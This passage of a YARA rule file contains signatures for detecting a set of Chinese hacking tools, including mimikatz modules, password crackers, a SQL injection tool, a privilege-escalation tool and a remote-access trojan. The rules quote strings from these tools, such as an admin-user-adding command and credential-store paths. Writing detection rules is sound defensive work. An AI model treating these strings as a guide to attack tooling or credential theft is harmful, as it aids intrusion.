\"TracKid.dll\" fullword ascii\n      $s4 = \".\\\\TracKid Log\" fullword ascii\n      $s5 = \"%08x -- %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them\n}\n\nrule sekurlsa_RID2A7B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file sekurlsa_RID2A7B.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:16:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Bienvenue dans un processus distant\" fullword wide\n      $s2 = \"Format d'appel invalide : addLogonSession [idSecAppHigh] idSecAppLow Utilisateur\" wide\n      $s3 = \"SECURITY\\\\Policy\\\\Secrets\" fullword wide\n      $s4 = \"Injection de donn\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1150KB and all of them\n}\n\nrule mysqlfast_RID2AF5 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file mysqlfast_RID2AF5.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:40:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Invalid password hash: %s\" fullword ascii\n      $s3 = \"-= MySql Hash Cracker =- \" fullword ascii\n      $s4 = \"Usage: %s hash\" fullword ascii\n      $s5 = \"Hash: %08lx%08lx\" fullword ascii\n      $s6 = \"Found pass: \" fullword ascii\n      $s7 = \"Pass not found\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 4 of them\n}\n\nrule DTools2_02_DTools_RID2D0D : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file DTools.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:15:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"kernel32.dll\" ascii\n      $s1 = \"TSETPASSWORDFORM\" fullword wide\n      $s2 = \"TGETNTUSERNAMEFORM\" fullword wide\n      $s3 = \"TPORTFORM\" fullword wide\n      $s4 = \"ShellFold\" fullword ascii\n      $s5 = \"DefaultPHotLigh\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule dll_PacketX_RID2B5C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file PacketX.dll - ActiveX wrapper for WinPcap packet capture library\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:03:11\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"[Failed to load winpcap packet.dll.\" wide\n      $s10 = \"PacketX Version\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1920KB and all of them\n}\n\nrule SqlDbx_zhs_RID2B13 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file SqlDbx_zhs_RID2B13.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:51:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"S.failed_logins \\\"Failed Login Attempts\\\", \" fullword ascii\n      $s7 = \"SELECT ROLE, PASSWORD_REQUIRED FROM SYS.DBA_ROLES ORDER BY ROLE\" fullword ascii\n      $s8 = \"SELECT spid 'SPID', status 'Status', db_name (dbid) 'Database', loginame 'Login'\" ascii\n      $s9 = \"bcp.exe <:schema:>.<:table:> out \\\"<:file:>\\\" -n -S <:server:> -U <:user:> -P <:\" ascii\n      $s11 = \"L.login_policy_name AS \\\"Login Policy\\\", \" fullword ascii\n      $s12 = \"mailto:support@sqldbx.com\" fullword ascii\n      $s15 = \"S.last_login_time \\\"Last Login\\\", \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and 4 of them\n}\n\nrule DUBrute_DUBrute_RID2CA6 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file DUBrute.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:58:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"IP - %d; Login - %d; Password - %d; Combination - %d\" fullword ascii\n      $s2 = \"IP - 0; Login - 0; Password - 0; Combination - 0\" fullword ascii\n      $s3 = \"Create %d IP@Loginl;Password\" fullword ascii\n      $s4 = \"UBrute.com\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1020KB and all of them\n}\n\nrule ChineseHack_Tool_RID2D44 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file CookieTools.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:24:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-20\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://210.73.64.88/doorway/cgi-bin/getclientip.asp?IP=\" fullword ascii\n      $s2 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n      $s3 = \"Connection Closed Gracefully.;Could not bind socket. Address and port are alread\" wide\n      $s4 = \"OnGetPasswordP\" fullword ascii\n      $s5 = \"http://www.chinesehack.org/\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 4 of them\n}\n\nrule dat_NaslLib_RID2B4E : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file NaslLib.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:00:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"nessus_get_socket_from_connection: fd <%d> is closed\" fullword ascii\n      $s2 = \"[*] \\\"%s\\\" completed, %d/%d/%d/%d:%d:%d - %d/%d/%d/%d:%d:%d\" fullword ascii\n      $s3 = \"A FsSniffer backdoor seems to be running on this port%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1360KB and all of them\n}\n\nrule Dos_1_RID28C7 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file 1.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 18:10:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/churrasco/-->Usage: Churrasco.exe \\\"command to run\\\"\" fullword ascii\n      $s2 = \"/churrasco/-->Done, command should have ran as SYSTEM!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule OtherTools_servu_RID2DB8 : CHINA DEMO FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file svu.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:43:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"MZKERNEL32.DLL\" fullword ascii\n      $s1 = \"UpackByDwing@\" fullword ascii\n      $s2 = \"GetProcAddress\" fullword ascii\n      $s3 = \"WriteFile\" fullword ascii\n   condition: \n      uint32 ( 0 ) == 0x454b5a4d and $s0 at 0 and filesize < 50KB and all of them\n}\n\nrule ustrrefadd_RID2B45 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file ustrrefadd_RID2B45.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:59:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"E-Mail  : admin@luocong.com\" fullword ascii\n      $s1 = \"Homepage: http://www.luocong.com\" fullword ascii\n      $s2 = \": %d  -  \" fullword ascii\n      $s3 = \"ustrreffix.dll\" fullword ascii\n      $s5 = \"Ultra String Reference plugin v%d.%02d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 320KB and all of them\n}\n\nrule XScanLib_RID2A05 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file XScanLib_RID2A05.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 03:00:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"XScanLib_RID2A05.dll\" fullword ascii\n      $s6 = \"Ports/%s/%d\" fullword ascii\n      $s8 = \"DEFAULT-TCP-PORT\" fullword ascii\n      $s9 = \"PlugCheckTcpPort\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 360KB and all of them\n}\n\nrule IDTools_For_WinXP_IdtTool_RID3088 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file IdtTool.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 12:43:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"IdtTool.sys\" fullword ascii\n      $s4 = \"Idt Tool bY tMd[CsP]\" fullword wide\n      $s6 = \"\\\\\\\\.\\\\slIdtTool\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 25KB and all of them\n}\n\nrule GoodToolset_ms11046_RID2DBF : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file ms11046.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:45:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[*] Token system command\" fullword ascii\n      $s2 = \"[*] command add user 90sec 90sec\" fullword ascii\n      $s3 = \"[*] Add to Administrators success\" fullword ascii\n      $s4 = \"[*] User has been successfully added\" fullword ascii\n      $s5 = \"Program: %s%s%s%s%s%s%s%s%s%s%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 840KB and 2 of them\n}\n\nrule Sniffer_analyzer_SSClone_1210_full_version_RID3733 : CHINA DEMO EXE FILE HKTL T1040 {\n   meta:\n      description = \"Chinese Hacktool Set - file Sniffer analyzer SSClone 1210 full version.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 17:28:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://www.vip80000.com/hot/index.html\" fullword ascii\n      $s1 = \"GetConnectString\" fullword ascii\n      $s2 = \"CnCerT.Safe.SSClone.dll\" fullword ascii\n      $s3 = \"(*.JPG;*.BMP;*.GIF;*.ICO;*.CUR)|*.JPG;*.BMP;*.GIF;*.ICO;*.CUR|JPG\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3580KB and all of them\n}\n\nrule x64_klock_RID2A66 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file klock.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 05:41:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Bienvenue dans un processus distant\" fullword wide\n      $s2 = \"klock.dll\" fullword ascii\n      $s3 = \"Erreur : le bureau courant (\" wide\n      $s4 = \"klock de mimikatz pour Windows\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 907KB and all of them\n}\n\nrule MarathonTool_2_RID2C7A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file MarathonTool.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:50:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"http://localhost/retomysql/pista.aspx?id_pista=1\" fullword wide\n      $s6 = \"SELECT ASCII(SUBSTR(username,{0},1)) FROM USER_USERS\" fullword wide\n      $s17 = \"/Blind SQL injection tool based in heavy queries\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule scanms_scanms_RID2C7A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file scanms.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:50:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"--- ScanMs Tool --- (c) 2003 Internet Security Systems ---\" fullword ascii\n      $s2 = \"Scans for systems vulnerable to MS03-026 vuln\" fullword ascii\n      $s3 = \"More accurate for WinXP/Win2k, less accurate for WinNT\" fullword ascii\n      $s4 = \"added %d.%d.%d.%d-%d.%d.%d.%d\" fullword ascii\n      $s5 = \"Internet Explorer 1.0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them\n}\n\nrule CN_Tools_PcShare_RID2D17 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file PcShare.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:17:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"title=%s%s-%s;id=%s;hwnd=%d;mainhwnd=%d;mainprocess=%d;cmd=%d;\" fullword wide\n      $s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\" fullword wide\n      $s2 = \"http://www.pcshares.cn/pcshare200/lostpass.asp\" fullword wide\n      $s5 = \"port=%s;name=%s;pass=%s;\" fullword wide\n      $s16 = \"%s\\\\ini\\\\*.dat\" fullword wide\n      $s17 = \"pcinit.exe\" fullword wide\n      $s18 = \"http://www.pcshare.cn\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and 3 of them\n}\n\nrule pw_inspector_RID2C2E : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file pw-inspector.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:38:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-m MINLEN  minimum length of a valid password\" fullword ascii\n      $s2 = \"http://www.thc.org\" fullword ascii\n      $s3 = \"Use for hacking: trim your dictionary file to the pw requirements of the target.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 460KB and all of them\n}\n\nrule Dll_LoadEx_RID2AC9 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Dll_LoadEx_RID2AC9.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:26:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WiNrOOt@126.com\" fullword wide\n      $s1 = \"Dll_LoadEx_RID2AC9.EXE\" fullword wide\n      $s3 = \"You Already Loaded This DLL ! :(\" ascii\n      $s10 = \"Dll_LoadEx_RID2AC9 Microsoft \" fullword wide\n      $s17 = \"Can't Load This Dll ! :(\" ascii\n      $s18 = \"WiNrOOt\" fullword wide\n      $s20 = \" Dll_LoadEx_RID2AC9(&A)...\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 120KB and 3 of them\n}\n\nrule Dos_iis7_RID2A12 : CHINA DEMO EXE FILE HKTL T1033 {\n   meta:\n      description = \"Chinese Hacktool Set - file iis7.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 03:21:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1033\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\\\\\localhost\" fullword ascii\n      $s1 = \"iis.run\" fullword ascii\n      $s3 = \">Could not connecto %s\" fullword ascii\n      $s5 = \"WHOAMI\" ascii\n      $s13 = \"WinSta0\\\\Default\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 140KB and all of them\n}\n\nrule SQLCracker_RID2ABC : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file SQLCracker_RID2ABC.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:05:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"msvbvm60.dll\" fullword ascii\n      $s1 = \"_CIcos\" fullword ascii\n      $s2 = \"kernel32.dll\" fullword ascii\n      $s3 = \"cKmhV\" fullword ascii\n      $s4 = \"080404B0\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 125KB and all of them\n}\n\nrule Dos_look_RID2A4B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file look.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 04:56:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<description>CHKen QQ:41901298</description>\" fullword ascii\n      $s2 = \"version=\\\"9.9.9.9\\\"\" fullword ascii\n      $s3 = \"name=\\\"CH.Ken.Tool\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them\n}\n\nrule NtGodMode_RID2A72 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file NtGodMode_RID2A72.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:01:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"to HOST!\" fullword ascii\n      $s1 = \"SS.EXE\" fullword ascii\n      $s5 = \"lstrlen0\" fullword ascii\n      $s6 = \"Virtual\" fullword ascii\n      $s19 = \"RtlUnw\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 45KB and all of them\n}\n\nrule WebCrack4_RouterPasswordCracking_RID339C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file WebCrack4-RouterPasswordCracking.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 14:55:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://www.site.com/test.dll?user=%USERNAME&pass=%PASSWORD\" fullword ascii\n      $s1 = \"Username: \\\"%s\\\", Password: \\\"%s\\\", Remarks: \\\"%s\\\"\" fullword ascii\n      $s14 = \"user:\\\"%s\\\" pass: \\\"%s\\\" result=\\\"%s\\\"\" fullword ascii\n      $s16 = \"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)\" fullword ascii\n      $s20 = \"List count out of bounds (%d)+Operation not allowed on sorted string list%String\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 2 of them\n}\n\nrule S_MultiFunction_Scanners_s_RID3182 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file s.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:25:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"C:\\\\WINDOWS\\\\temp\\\\pojie.exe /l=\" fullword ascii\n      $s1 = \"C:\\\\WINDOWS\\\\temp\\\\s.exe\" fullword ascii\n      $s2 = \"C:\\\\WINDOWS\\\\temp\\\\s.exe tcp \" fullword ascii\n      $s3 = \"explorer.exe http://www.hackdos.com\" fullword ascii\n      $s4 = \"C:\\\\WINDOWS\\\\temp\\\\pojie.exe\" fullword ascii\n      $s5 = \"Failed to read file or invalid data in file!\" fullword ascii\n      $s6 = \"www.hackdos.com\" fullword ascii\n      $s7 = \"WTNE / MADE BY E COMPILER - WUTAO \" fullword ascii\n      $s11 = \"The interface of kernel library is invalid!\" fullword ascii\n      $s12 = \"eventvwr\" fullword ascii\n      $s13 = \"Failed to decompress data!\" fullword ascii\n      $s14 = \"NOTEPAD.EXE result.txt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and 4 of them\n}\n\nrule HKTL_CN_Dos_GetPass_RID2DCF : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file GetPass.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:47:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"GetLogonS\" ascii\n      $s3 = \"/showthread.php?t=156643\" ascii\n      $s8 = \"To Run As Administ\" ascii\n      $s18 = \"EnableDebugPrivileg\" fullword ascii\n      $s19 = \"sedebugnameValue\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 890KB and all of them\n}\n\nrule HKTL_CN_update_PcMain_RID2EAD : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file PcMain.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:24:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; .NET CLR 1.1.4322\" ascii\n      $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SvcHost\" fullword ascii\n      $s2 = \"SOFTWARE\\\\Classes\\\\HTTP\\\\shell\\\\open\\\\command\" fullword ascii\n      $s3 = \"\\\\svchost.exe -k \" ascii\n      $s4 = \"SYSTEM\\\\ControlSet001\\\\Services\\\\%s\" fullword ascii\n      $s9 = \"Global\\\\%s-key-event\" fullword ascii\n      $s10 = \"%d%d.exe\" fullword ascii\n      $s14 = \"%d.exe\" fullword ascii\n      $s15 = \"Global\\\\%s-key-metux\" fullword ascii\n      $s18 = \"GET / HTTP/1.1\" fullword ascii\n      $s19 = \"\\\\Services\\\\\" ascii\n      $s20 = \"qy001id=%d;qy001guid=%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 4 of them\n}\n\nrule HKTL_CN_Dos_sys_RID2C77 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file sys.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:50:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"'SeDebugPrivilegeOpen \" fullword ascii\n      $s6 = \"Author: Cyg07*2\" fullword ascii\n      $s12 = \"from golds7n[LAG]'J\" fullword ascii\n      $s14 = \"DAMAGE\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule HKTL_CN_dat_xpf_RID2C79 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file xpf.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:50:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"UnHook IoGetDeviceObjectPointer ok!\" fullword ascii\n      $s2 = \"\\\\Device\\\\XScanPF\" wide\n      $s3 = \"\\\\DosDevices\\\\XScanPF\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 25KB and all of them\n}\n\nrule HKTL_CN_Project1_RID2C9B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Project1.exe\"\n      author = \"Florian Roth\"\n      reference = 